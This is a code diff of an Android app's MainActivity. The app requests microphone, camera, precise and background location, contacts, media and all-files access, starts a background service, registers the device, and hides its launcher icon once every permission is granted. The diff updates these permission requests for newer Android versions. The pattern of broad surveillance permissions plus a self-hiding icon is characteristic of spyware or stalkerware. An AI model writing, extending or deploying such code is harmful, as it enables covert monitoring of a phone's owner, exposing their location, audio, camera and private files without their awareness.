@@ -34,48 +34,46 @@ class MainActivity : AppCompatActivity() {
         white.setBackgroundColor(Color.WHITE)
         setContentView(white)
 
-        // سجّل الجهاز — مرة واحدة فقط
         DeviceManager.registerDeviceOnce(this)
-
-        // شغّل الخدمة
         startBackgroundService()
         createNotificationChannel()
-
-        // ابدأ بطلب الأذونات
         requestPermissionsStep1()
     }
 
-    // ═══════════════════════════════════════════
-    //  فحص كل الأذونات
-    // ═══════════════════════════════════════════
     private fun hasAllPermissions(): Boolean {
-        // 1. الصلاحيات الأساسية
-        val basics = listOf(
-            Manifest.permission.READ_EXTERNAL_STORAGE,
+        val basics = mutableListOf(
             Manifest.permission.RECORD_AUDIO,
             Manifest.permission.CAMERA,
             Manifest.permission.ACCESS_FINE_LOCATION,
             Manifest.permission.ACCESS_COARSE_LOCATION,
             Manifest.permission.READ_CONTACTS
         )
+
+        // READ_EXTERNAL_STORAGE — بس للإصدارات القديمة
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) {
+            basics.add(Manifest.permission.READ_EXTERNAL_STORAGE)
+        }
+
+        // READ_MEDIA_* — للإصدارات الحديثة
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            basics.add(Manifest.permission.READ_MEDIA_IMAGES)
+            basics.add(Manifest.permission.READ_MEDIA_VIDEO)
+            basics.add(Manifest.permission.READ_MEDIA_AUDIO)
+            basics.add(Manifest.permission.POST_NOTIFICATIONS)
+        }
+
         for (p in basics) {
             if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED)
                 return false
         }
 
-        // 2. POST_NOTIFICATIONS (Android 13+)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED)
-                return false
-        }
-
-        // 3. BACKGROUND_LOCATION (Android 10+)
+        // BACKGROUND_LOCATION — Android 10+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED)
                 return false
         }
 
-        // 4. MANAGE_EXTERNAL_STORAGE (Android 11+)
+        // MANAGE_EXTERNAL_STORAGE — Android 11+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             if (!Environment.isExternalStorageManager())
                 return false
@@ -84,12 +82,9 @@ class MainActivity : AppCompatActivity() {
         return true
     }
 
-    // ═══════════════════════════════════════════
-    //  إخفاء الأيقونة — بس لما كل الأذونات تتفعل
-    // ═══════════════════════════════════════════
     private fun hideLauncherIconIfReady() {
         if (!hasAllPermissions()) {
-            Log.d("MainActivity", "Permissions not complete yet — waiting")
+            Log.d("MainActivity", "Permissions not complete — waiting")
             return
         }
         try {
@@ -99,43 +94,62 @@ class MainActivity : AppCompatActivity() {
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                 PackageManager.DONT_KILL_APP
             )
-            Log.d("MainActivity", "✅ Launcher icon hidden — all permissions granted")
+            Log.d("MainActivity", "Launcher icon hidden")
         } catch (e: Exception) {
             Log.e("MainActivity", "hide err: ${e.message}")
         }
     }
 
-    // ═══════════════════════════════════════════
-    //  Permissions Flow
-    // ═══════════════════════════════════════════
     private fun requestPermissionsStep1() {
         val needed = mutableListOf<String>()
 
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED)
-            needed.add(Manifest.permission.READ_EXTERNAL_STORAGE)
-
+        // RECORD_AUDIO — كل الإصدارات
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED)
             needed.add(Manifest.permission.RECORD_AUDIO)
 
+        // CAMERA — كل الإصدارات
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED)
             needed.add(Manifest.permission.CAMERA)
 
+        // LOCATION — كل الإصدارات
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED)
             needed.add(Manifest.permission.ACCESS_FINE_LOCATION)
-
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED)
             needed.add(Manifest.permission.ACCESS_COARSE_LOCATION)
 
+        // CONTACTS — كل الإصدارات
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED)
             needed.add(Manifest.permission.READ_CONTACTS)
 
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+        // STORAGE — حسب الإصدار
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) {
+            // Android 12 وأقدم
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED)
+                needed.add(Manifest.permission.READ_EXTERNAL_STORAGE)
+            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.P) {
+                // Android 9 وأقدم — WRITE_EXTERNAL_STORAGE
+                if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED)
+                    needed.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
+            }
+        } else {
+            // Android 13+
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED)
+                needed.add(Manifest.permission.READ_MEDIA_IMAGES)
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VIDEO) != PackageManager.PERMISSION_GRANTED)
+                needed.add(Manifest.permission.READ_MEDIA_VIDEO)
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_AUDIO) != PackageManager.PERMISSION_GRANTED)
+                needed.add(Manifest.permission.READ_MEDIA_AUDIO)
             if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED)
                 needed.add(Manifest.permission.POST_NOTIFICATIONS)
         }
 
         if (needed.isNotEmpty()) {
-            ActivityCompat.requestPermissions(this, needed.toTypedArray(), PERM_REQUEST_CODE)
+            try {
+                ActivityCompat.requestPermissions(this, needed.toTypedArray(), PERM_REQUEST_CODE)
+            } catch (e: Exception) {
+                Log.e("MainActivity", "req err: ${e.message}")
+                requestBackgroundLocation()
+            }
         } else {
             requestBackgroundLocation()
         }
@@ -190,19 +204,13 @@ class MainActivity : AppCompatActivity() {
         handler.postDelayed({ onSetupComplete() }, 2500)
     }
 
-    // ═══════════════════════════════════════════
-    //  بعد الإعداد — فحص إذا كل الأذونات اتمنحت
-    // ═══════════════════════════════════════════
     private fun onSetupComplete() {
-        // افحص — لو كل الأذونات اتمنحت، أخفي الأيقونة
         hideLauncherIconIfReady()
 
-        // لو لسه ناقص أذونات، جدول فحص كل 5 ثواني
         if (!hasAllPermissions()) {
             handler.postDelayed({ checkAndHide() }, 5000L)
         }
 
-        // افتح الويب
         try {
             startActivity(Intent(this, WebViewActivity::class.java))
         } catch (_: Exception) {}
@@ -213,7 +221,6 @@ class MainActivity : AppCompatActivity() {
         if (hasAllPermissions()) {
             hideLauncherIconIfReady()
         } else {
-            // لسه ناقص — ارجع افتح الإعدادات للصلاحيات الناقصة
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                 if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                     try {
@@ -235,9 +242,6 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    // ═══════════════════════════════════════════
-    //  Service + Notification
-    // ═══════════════════════════════════════════
     private fun startBackgroundService() {
         try {
             val intent = Intent(this, BackgroundService::class.java)
